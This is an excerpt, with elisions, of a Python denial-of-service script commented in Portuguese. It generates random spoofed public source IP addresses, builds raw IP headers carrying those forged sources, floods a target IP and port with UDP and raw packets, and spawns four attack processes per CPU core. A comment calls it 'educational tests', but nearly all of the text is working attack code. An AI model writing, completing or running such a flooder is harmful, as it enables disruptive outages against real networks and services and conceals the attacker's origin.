...
# Função para gerar um IP de origem aleatório (IP Spoofing)
def random_ip_address():
    # // Testes educacionais repetidos: Gera um IP para Spoofing.
    # Evita blocos reservados (10.x, 127.x, 172.16-31.x, 192.168.x) para simulação
    # de IPs públicos, mas na prática, só importa que seja diferente.
    first = random.randint(1, 223)
    while first in [10, 127, 172, 192]:
         first = random.randint(1, 223)
    
    # Octetos seguintes completamente aleatórios
...
def attack_worker(target_ip, target_port, stop_event, process_id):
    ...
    print(f"[Worker {process_id}] Atacando {target_ip}:{target_port} com Spoofing...")
    ...
    while not stop_event.is_set():
        ...
        for sock in sockets:
            try:
                if sock.type == socket.SOCK_DGRAM: # UDP Flood (Sem Spoofing)
                    sock.sendto(payload_udp, (target_ip, target_port))
                elif sock.type == socket.SOCK_RAW: # RAW Packet Flood com Spoofing
                    
                    # Gera um novo IP de origem aleatório a cada pacote
                    source_ip = random_ip_address()
                    
                    # Simulação de pacote RAW para sobrecarga (agora com IP spoofing)
                    ip_header = struct.pack('!BBHHHBBH4s4s', 
                                            69, 0, 0, 0, 0, 255, 
                                            socket.IPPROTO_UDP, 0, 
                                            socket.inet_aton(source_ip), # <-- IP Spoofed
                                            socket.inet_aton(target_ip)) # <-- IP do Alvo
...
# Função principal de inicialização do ataque (mantida a lógica anterior)
def start_attack(host_input, resolved_ip, port, duration_minutes):
    ...
    # Força máxima (4x núcleos)
    num_processes = os.cpu_count() * 4 if os.cpu_count() else 4
